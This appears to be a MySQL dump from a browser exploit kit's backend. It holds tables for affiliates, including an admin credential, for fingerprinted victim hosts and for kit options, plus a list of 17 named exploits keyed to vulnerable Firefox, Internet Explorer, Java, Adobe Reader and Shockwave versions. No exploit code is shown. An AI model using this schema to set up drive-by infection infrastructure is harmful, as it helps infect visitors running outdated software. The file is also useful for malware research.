-- MySQL dump 10.13  Distrib 5.1.66, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: ezic
-- ------------------------------------------------------
-- Server version	5.1.66-0+squeeze1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;


--
-- Table structure for table `affiliates`
--

CREATE TABLE IF NOT EXISTS `affiliates` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `username` varchar(30) NOT NULL,
  `password` text NOT NULL,
  `affid` varchar(30) NOT NULL,
  `email` text NOT NULL,
  `cook` text NOT NULL,
  `filez` varchar(30) NOT NULL,
  `city` varchar(100) NOT NULL,
  `blankcheck` varchar(4) NOT NULL,
  `windowsonly` varchar(4) NOT NULL,
  `antivp` varchar(4) NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `username` (`username`,`affid`,`filez`,`city`),
  KEY `username_2` (`username`,`affid`),
  KEY `affid` (`antivp`,`username`),
  KEY `googlep` (`antivp`,`affid`),
  KEY `affid_2` (`affid`,`antivp`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `affiliates`
--

INSERT INTO `affiliates` (`id`, `username`, `password`, `affid`, `email`, `cook`, `filez`, `city`, `blankcheck`, `windowsonly`, `antivp`) VALUES
(1, 'Admin', 'tuTK5bNZfuw', 'admin', 'changeme', '5465754554', '', 'NONE', 'yes', 'yes', 'yes');


--
-- Table structure for table `hosts`
--

CREATE TABLE IF NOT EXISTS `hosts` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `ip` int(10) unsigned NOT NULL default '0',
  `browser` varchar(30) NOT NULL,
  `browser_version` varchar(30) NOT NULL,
  `os` varchar(30) NOT NULL,
  `os_flavor` varchar(30) NOT NULL,
  `service_pack` varchar(30) NOT NULL,
  `os_lang` varchar(30) NOT NULL,
  `country` varchar(6) NOT NULL,
  `arch` varchar(30) NOT NULL,
  `loads` varchar(3) NOT NULL,
  `exeload` text NOT NULL,
  `exploit` varchar(30) NOT NULL,
  `referer` text NOT NULL,
  `aff` varchar(30) NOT NULL,
  `java` varchar(30) NOT NULL,
  `adobe` varchar(30) NOT NULL,
  `quicktime` varchar(30) NOT NULL,
  `flash` varchar(30) NOT NULL,
  `shockwave` varchar(30) NOT NULL,
  `vlc` varchar(30) NOT NULL,
  `realplayer` varchar(30) NOT NULL,
  `silverlight` varchar(30) NOT NULL,
  `time` timestamp NOT NULL default CURRENT_TIMESTAMP,
  PRIMARY KEY  (`id`),
  UNIQUE KEY `ip` (`ip`),
  KEY `os` (`os`),
  KEY `os_2` (`os`,`os_flavor`,`browser`,`browser_version`,`exploit`)
) ENGINE=MyISAM  DEFAULT CHARSET=cp1251 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `hosts`
--


-- --------------------------------------------------------

--
-- Table structure for table `options`
--

CREATE TABLE IF NOT EXISTS `options` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `mode` varchar(10) NOT NULL,
  `submode` varchar(10) NOT NULL,
  `check_crash` varchar(5) NOT NULL,
  `time_bxpl` int(3) NOT NULL,
  `keyz` text NOT NULL,
  `percent_rand` int(3) NOT NULL,
  `showxpl` int(3) NOT NULL,
  `priority` varchar(10) NOT NULL,
  `exploits_enabled` varchar(200),
  KEY `submode` (`submode`,`username`),
  KEY `username` (`username`,`submode`),
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

--
-- Dumping data for table `options`
--

INSERT INTO `options` (`id`, `username`, `mode`, `submode`, `check_crash`, `time_bxpl`, `keyz`, `percent_rand`, `showxpl`, `priority`, `exploits_enabled`) VALUES
('1', 'Admin', 'ai', 'personal', 'yes', 0, '', 20, 2, '', '');


--
-- Table structure for table `exploits`
--

DROP TABLE IF EXISTS `exploits`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `exploits` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(25) DEFAULT NULL,
  `uaname` varchar(25) DEFAULT NULL,
  `uavermin` varchar(15) DEFAULT NULL,
  `uavermax` varchar(15) DEFAULT NULL,
  `os` varchar(15) DEFAULT NULL,
  `flavor` varchar(10) DEFAULT NULL,
  `arch` varchar(8) DEFAULT NULL,
  `plugin` varchar(15) DEFAULT NULL,
  `pluginminver` varchar(15) DEFAULT NULL,
  `pluginmaxver` varchar(15) DEFAULT NULL,
  `groups` varchar(11) DEFAULT NULL,
  `description` varchar(25) DEFAULT NULL,
  `views` int(10) DEFAULT 0,
  `loads` int(10) DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES ('1', 'mozilla35', 'Firefox', '3.5', '3.5', 'Windows', 'XP', 'x86', '', '', '', 'Other', 'Firefox Overflow', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES ('2', 'mozilla_compareto', 'Mozilla,Firefox', '1.7,1.0', '1.7.10,1.0.4', 'Windows', '', 'x86', '', '', '', 'Other', 'Firefox CompareTo', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES ('3', 'iepeers', 'MSIE', '6.0', '6.0', 'Windows', 'NT,2000,XP,2003', 'x86', '', '', '', 'Other', 'iepeers 6.0', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES ('4', 'ms09_043', 'MSIE', '6.0', '7.0', 'Windows', 'XP', 'x86', '', '', '', 'Other', 'MS09_043', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (5, 'iepeers7', 'MSIE', '7.0', '7.0', 'Windows', 'NT,2000,XP,2003,Vista', 'x86', '', '', '', 'Other', 'iepeers 7.0', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (6, 'ms09_002', 'MSIE', '7.0', '7.0', 'Windows', 'XP,Vista', 'x86', '', '', '', 'Other', 'MS09_002', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (7, 'directshow', 'MSIE', '6.0', '7.0', 'Windows', 'XP', 'x86', '', '', '', 'Other', 'Microsoft Directshow', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (8, 'ms11_xxx', 'MSIE', '6.0', '8.0', 'Windows', '', 'x86', '', '', '', 'Other', 'MS11_003', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (9, 'firefoxinter', 'Firefox', '3.6.8', '3.6.11', 'Windows', 'XP,2003', 'x86', '', '', '', 'Other', 'Firefox Interleaved', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (10, 'javadocbase', '', '', '', 'Windows', '', 'x86', 'Java', '1.6.0.18', '1.6.0.21', 'Plugin', 'Java Docbase', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (11, 'shockwave', '', '', '', 'Windows', '', 'x86', 'Shockwave', '11.0.0.0', '11.5.7.609', 'Plugin', 'Shockwave RCSL', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (12, 'java_arginject', '', '', '', 'Windows', '', 'x86', 'Java', '1.6.0.10', '1.6.0.19', 'Plugin', 'Java Argument Injection', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (13, 'javacalendar', '', '', '', 'Windows', '', 'x86', 'Java', '1.4', '1.6.0.10', 'Plugin', 'Java Calendar Deserialization', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (14, 'adobelibtiff', '', '', '', 'Windows', '', 'x86', 'Adobe', '8.0', '9.3', 'Plugin', 'Adobe Reader LibTiff', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (15, 'adobenewplayer', '', '', '', 'Windows', '', 'x86', 'Adobe', '8.0', '9.2', 'Plugin', 'Adobe Reader NewPlayer', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (16, 'javaCMM', '', '', '', 'Windows', '', 'x86', 'Java', '1.4', '1.6.0.18', 'Plugin', 'Java readMabCurveData', '0', '0');

INSERT INTO `exploits` (`id`, `name`, `uaname`, `uavermin`, `uavermax`, `os`, `flavor`, `arch`, `plugin`, `pluginminver`, `pluginmaxver`, `groups`, `description`, `views`, `loads`) VALUES (17, 'javadrive', '', '', '', 'Windows', '', 'x86', 'Java', '', '', 'Plugin', 'Java DriveBy', '0', '0');

